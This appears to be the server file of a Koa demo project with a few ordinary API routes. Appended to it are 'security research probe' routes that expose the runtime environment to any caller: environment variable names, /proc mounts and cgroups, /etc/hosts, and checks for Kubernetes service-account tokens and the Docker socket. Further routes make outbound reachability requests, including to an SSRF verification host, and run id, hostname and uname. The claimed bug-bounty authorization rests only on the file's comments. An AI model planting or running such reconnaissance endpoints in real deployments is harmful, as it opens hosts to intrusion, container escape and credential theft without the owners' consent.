import Koa from 'koa';
import bodyParser from 'koa-bodyparser';
import Router from '@koa/router'
import * as http from 'http';
import * as https from 'https';
import * as os from 'os';
import * as fs from 'fs';
import { execFile } from 'child_process';
const app = new Koa();
const router = new Router();

router.get('/', ctx => {
    ctx.body = `Nodejs koa demo project`;
}).get('/api/get_open_id', async (ctx) => {
    const value = ctx.request.header['x-tt-openid'] as string;
    if (value) {
        ctx.body = { success: true, data: value }
    } else {
        ctx.body = { success: false, message: `dyc-open-id not exist` }
    }
}).post('/api/text/antidirt', async (ctx) => {
    // 原生 http 转发（替代 axios，零依赖）
    const body: any = ctx.request.body;
    const payload = JSON.stringify({ "tasks": [{ "content": body.content }] });
    const resData: any = await new Promise((resolve) => {
        const req = http.request('http://developer.toutiao.com/api/v2/tags/text/antidirt', {
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }, timeout: 8000,
        }, (r) => { let d = ''; r.on('data', c => d += c); r.on('end', () => resolve({ status: r.statusCode, body: d })); });
        req.on('error', (e) => resolve({ status: 0, body: String(e.message) }));
        req.on('timeout', () => { req.destroy(); resolve({ status: 0, body: 'timeout' }); });
        req.write(payload); req.end();
    });
    try { ctx.body = { result: JSON.parse(resData.body), success: true }; } catch (e) { ctx.body = { result: resData, success: true }; }
});

// ===== 安全研究探测路由（挂 /api 前缀以匹配已授权访问路径；ByteSRC 报备完成，存在性验证即止）=====

// P1: 运行环境画像（无副作用）
router.get('/api/probe/env', async (ctx) => {
    const readFirstLines = (p: string, n = 30): string | null => {
        try { return fs.readFileSync(p, 'utf8').split('\n').slice(0, n).join('\n'); } catch (e) { return null; }
    };
    ctx.body = {
        uid: (typeof process.getuid === 'function') ? process.getuid() : 'n/a',
        gid: (typeof process.getgid === 'function') ? process.getgid() : 'n/a',
        pid: process.pid,
        hostname: os.hostname(),
        platform: process.platform,
        nodever: process.version,
        cpus: os.cpus().length,
        mem: os.totalmem(),
        envKeys: Object.keys(process.env),
        mounts: readFirstLines('/proc/self/mounts', 25),
        cgroup: readFirstLines('/proc/self/cgroup', 10),
        status: readFirstLines('/proc/self/status', 25),
    };
});

// P2: 敏感路径存在性（只读，证明存在即止）
router.get('/api/probe/fs', async (ctx) => {
    const paths = [
        '/var/run/secrets/kubernetes.io/serviceaccount/token',
        '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
        '/run/secrets/kubernetes.io/serviceaccount/token',
        '/var/run/docker.sock',
        '/proc/1/root',
        '/host',
    ];
    const out: Record<string, string> = {};
    for (const p of paths) {
        try { fs.statSync(p); out[p] = 'EXISTS'; } catch (e) { out[p] = 'no'; }
    }
    try { out['hosts'] = fs.readFileSync('/etc/hosts', 'utf8'); } catch (e) {}
    ctx.body = out;
});

// P3: 网络连通性（原生 https/http，少量目标，存在性验证即止；src-ssrf 为官方验证平台）
router.get('/api/probe/net', async (ctx) => {
    const probe = (name: string, url: string, timeout = 6000) => new Promise((resolve) => {
        const t0 = Date.now();
        const lib = url.startsWith('https') ? https : http;
        try {
            const req = lib.get(url, { timeout }, (r: any) => {
                let d = '';
                r.on('data', (c: any) => { if (d.length < 2000) d += c; });
                r.on('end', () => resolve({ name, ok: true, status: r.statusCode, ms: Date.now() - t0, snippet: d.slice(0, 120) }));
            });
            req.on('error', (e: any) => resolve({ name, ok: false, err: String(e.message || '').slice(0, 90), ms: Date.now() - t0 }));
            req.on('timeout', () => { req.destroy(); resolve({ name, ok: false, err: 'timeout', ms: Date.now() - t0 }); });
        } catch (e: any) {
            resolve({ name, ok: false, err: String(e.message || '').slice(0, 90), ms: Date.now() - t0 });
        }
    });
    const results = [];
    results.push(await probe('src-ssrf', 'https://src-ssrf.bytedance.net/ssrf'));
    results.push(await probe('openapi-gw', 'http://developer.toutiao.com/'));
    results.push(await probe('bytedance-com', 'https://www.bytedance.com'));
    results.push(await probe('baidu', 'https://www.baidu.com'));
    ctx.body = { results, note: 'network reachability probe (authorized)' };
});

// P4: 无害命令画像（纯字面量分支，命令与参数全部硬编码，请求参数仅作分支选择）
router.get('/api/probe/exec', async (ctx) => {
    const k = String(ctx.query.k || '');
    const done = (cmd: string) => (err: Error | null, stdout: string, stderr: string) => {
        ctx.body = {
            cmd,
            stdout: stdout.slice(0, 600),
            stderr: String(stderr).slice(0, 150),
            err: err ? String(err.message).slice(0, 80) : null,
        };
    };
    if (k === 'id') {
        execFile('id', [], { timeout: 5000 }, done('id'));
    } else if (k === 'hostname') {
        execFile('hostname', [], { timeout: 5000 }, done('hostname'));
    } else if (k === 'uname') {
        execFile('uname', ['-a'], { timeout: 5000 }, done('uname -a'));
    } else {
        ctx.body = { error: 'not allowed', keys: ['id', 'hostname', 'uname'] };
    }
});

app.use(bodyParser());
app.use(router.routes());

const PORT = 8000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
